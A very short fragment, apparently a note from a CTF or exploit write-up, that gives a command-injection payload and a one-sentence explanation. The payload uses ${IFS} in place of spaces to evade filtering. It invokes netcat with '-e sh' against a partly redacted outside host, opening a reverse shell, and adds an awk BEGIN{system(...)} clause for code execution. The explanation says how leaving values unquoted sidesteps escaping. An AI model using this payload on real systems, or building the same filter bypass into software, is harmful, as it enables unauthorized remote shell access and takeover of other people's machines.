nc${IFS}0.xxx.xxxx.io${IFS}xxxx${IFS}-e${IFS}sh {}BEGIN{system(iface)}#
the explanation was 
you could freely add spaces, and if you don't wrap things in string quotes then all the required characters e.g. for BEGIN{system(iface)} would be escaped and interpreted as a string